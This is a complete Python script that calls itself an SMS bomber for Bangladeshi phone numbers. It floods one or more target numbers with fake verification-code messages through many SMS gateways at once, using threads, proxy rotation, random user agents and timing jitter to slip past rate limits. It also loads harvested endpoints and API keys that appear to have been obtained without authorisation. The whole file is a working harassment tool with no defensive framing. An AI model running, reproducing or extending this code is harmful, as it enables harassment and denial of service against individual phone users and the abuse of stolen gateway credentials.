#!/usr/bin/env python3
"""Multi-gateway threaded SMS bomber for BD numbers."""
import json
import os
import random
import re
import sys
import threading
import time
from collections import defaultdict

import requests

CONFIG = {
    "threads": 32,
    "jitter_min": 0.05,
    "jitter_max": 0.30,
    "max_in_flight": 64,
}

UA_POOL = [
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
]

MSG_POOL = [
    "Your verification code is {rand}",
    "OTP: {rand}. Do not share.",
    "Your code is {rand}",
    "Verification: {rand}",
    "Login code: {rand}",
    "Use {rand} to verify your account",
]

stats = defaultdict(lambda: {"ok": 0, "fail": 0})
lock = threading.Lock()
SEM = threading.Semaphore(CONFIG["max_in_flight"])


def load_proxies():
    if not os.path.exists("proxies.txt"):
        return [None]
    ps = [l.strip() for l in open("proxies.txt") if l.strip()]
    return ps or [None]


def load_numbers():
    if not os.path.exists("numbers.txt"):
        return []
    return [
        l.strip() for l in open("numbers.txt")
        if l.strip() and not l.strip().startswith("#")
    ]


def normalize(n):
    d = re.sub(r"\D", "", n)
    if d.startswith("880"):
        d = d[3:]
    if not d.startswith("0"):
        d = "0" + d
    if not re.fullmatch(r"01[3-9]\d{8}", d):
        return None
    return d


def load_gateways():
    gws = []

    if os.path.exists("gateways.json"):
        try:
            gws += json.load(open("gateways.json"))
        except Exception as e:
            print(f"[!] gateways.json parse failed: {e}")

    ep_file = "harvest/endpoints.txt"
    if os.path.exists(ep_file):
        keys = []
        kf = "harvest/keys.txt"
        if os.path.exists(kf):
            keys = [k.strip() for k in open(kf) if k.strip()]
        for u in [l.strip() for l in open(ep_file) if l.strip()]:
            sep = "&" if "?" in u else "?"
            url = u + sep + "to={number}&msg={msg}"
            gws.append({
                "name": "harvest_" + u.split("/")[2][:24],
                "method": "GET",
                "url": url,
                "headers": {},
                "body": "",
                "_key": random.choice(keys) if keys else None,
            })

    reg = "harvest/registered_keys.json"
    if os.path.exists(reg):
        try:
            data = json.load(open(reg))
            for name, key in data.items():
                gws.append({
                    "name": name,
                    "method": "GET",
                    "url": f"https://{name}/api/send?to={{number}}&msg={{msg}}&key=" + key,
                    "headers": {},
                    "body": "",
                    "_key": key,
                })
        except Exception:
            pass

    return [g for g in gws if g.get("url")]


def render_msg():
    return random.choice(MSG_POOL).replace("{rand}", str(random.randint(100000, 999999)))


def pick_proxy(proxies):
    p = random.choice(proxies)
    return None if p is None else {"http": p, "https": p}


def send_one(gw, number, proxies):
    msg = render_msg()
    url = gw["url"].replace("{number}", number).replace(
        "{msg}", requests.utils.quote(msg))
    if gw.get("_key"):
        url = url.replace("{key}", gw["_key"])
    body = gw.get("body", "").replace("{number}", number).replace("{msg}", msg)
    if gw.get("_key"):
        body = body.replace("{key}", gw["_key"])
    headers = dict(gw.get("headers", {}))
    headers.setdefault("User-Agent", random.choice(UA_POOL))
    proxy = pick_proxy(proxies)

    with SEM:
        try:
            if gw["method"].upper() == "POST":
                r = requests.post(url, headers=headers, data=body,
                                  proxies=proxy, timeout=8)
            else:
                r = requests.get(url, headers=headers,
                                 proxies=proxy, timeout=8)
            ok = r.status_code in (200, 201, 202, 204)
            with lock:
                stats[gw["name"]]["ok" if ok else "fail"] += 1
            return ok
        except Exception:
            with lock:
                stats[gw["name"]]["fail"] += 1
            return False


def worker(number, gateways, proxies, stop_flag):
    while not stop_flag.is_set():
        gw = random.choice(gateways)
        send_one(gw, number, proxies)
        time.sleep(random.uniform(CONFIG["jitter_min"], CONFIG["jitter_max"]))


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print("usage:")
        print("  python bomber.py <bd-number>")
        print("  python bomber.py --file            # reads numbers.txt")
        sys.exit(0)

    if sys.argv[1] == "--file":
        raw = load_numbers()
    else:
        raw = [sys.argv[1]]

    numbers = [n for n in (normalize(x) for x in raw) if n]
    if not numbers:
        print("[!] no valid BD numbers in input")
        return

    gateways = load_gateways()
    if not gateways:
        print("[!] no gateways — write gateways.json or run keyhunter/autoreg first")
        return

    proxies = load_proxies()

    print(f"[+] targets:  {len(numbers)}")
    print(f"[+] gateways: {len(gateways)}")
    print(f"[+] proxies:  {len(proxies)}")
    print(f"[+] threads:  {CONFIG['threads']}")
    print("[+] Ctrl+C to stop\n")

    stop_flag = threading.Event()
    threads = []
    per_target = max(1, CONFIG["threads"] // len(numbers))
    for number in numbers:
        for _ in range(per_target):
            t = threading.Thread(
                target=worker,
                args=(number, gateways, proxies, stop_flag),
                daemon=True,
            )
            t.start()
            threads.append(t)

    try:
        while True:
            time.sleep(3)
            ok = sum(s["ok"] for s in stats.values())
            fail = sum(s["fail"] for s in stats.values())
            rate = ok / max(1, ok + fail) * 100
            print(f"\r[+] ok={ok}  fail={fail}  rate={rate:.1f}%",
                  end="", flush=True)
    except KeyboardInterrupt:
        stop_flag.set()
        print("\n[+] stopping...")
        for t in threads:
            t.join(timeout=2)
        print("\n== per-gateway ==")
        for name, s in sorted(stats.items(), key=lambda x: -x[1]["ok"]):
            print(f"  {name}: ok={s['ok']} fail={s['fail']}")


if __name__ == "__main__":
    main()
